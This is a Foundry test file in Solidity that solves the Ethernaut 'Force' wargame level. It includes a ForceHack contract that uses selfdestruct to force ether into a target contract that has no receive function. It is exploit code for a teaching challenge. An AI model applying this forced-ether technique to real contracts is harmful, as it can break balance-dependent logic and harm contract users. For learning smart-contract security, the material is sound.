// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Force/ForceFactory.sol";
import "../src/Ethernaut.sol";

contract ForceTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testForceHack() public {
        /****************
         * Factory setup *
         *************** */
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        ForceHack forceHack = new ForceHack{value: 1 ether}(levelAddress);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}


contract ForceHack {
  constructor (address challengeAddress) payable {
    Force challenge = Force(payable(challengeAddress));
    selfdestruct(payable(address(challenge)));
  }
}
